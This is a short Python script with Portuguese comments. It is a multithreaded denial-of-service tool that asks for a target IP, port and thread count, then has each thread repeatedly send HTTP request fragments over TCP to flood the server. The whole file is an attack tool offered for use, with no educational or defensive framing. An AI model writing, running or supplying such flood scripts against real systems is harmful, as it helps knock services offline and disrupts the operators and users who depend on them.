import socket
import threading

def attack(ip, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((ip, port))
        # Envia uma carga pesada repetidamente para o servidor
        while True:
            client.sendto(b"GET / HTTP/1.1\r\n", (ip, port))
            print(f"Pacote enviado para {ip}:{port}")
    except socket.error as e:
        print(f"Erro de conexão: {e}")
    finally:
        client.close()

def start_attack(ip, port, threads):
    # Cria múltiplas threads para atacar simultaneamente
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port))
        thread.start()

if __name__ == "__main__":
    # Entrada do usuário para IP, porta e número de threads
    target_ip = input("Digite o IP de destino: ")
    target_port = int(input("Digite a porta de destino: "))
    num_threads = int(input("Digite o número de threads: "))

    start_attack(target_ip, target_port, num_threads)
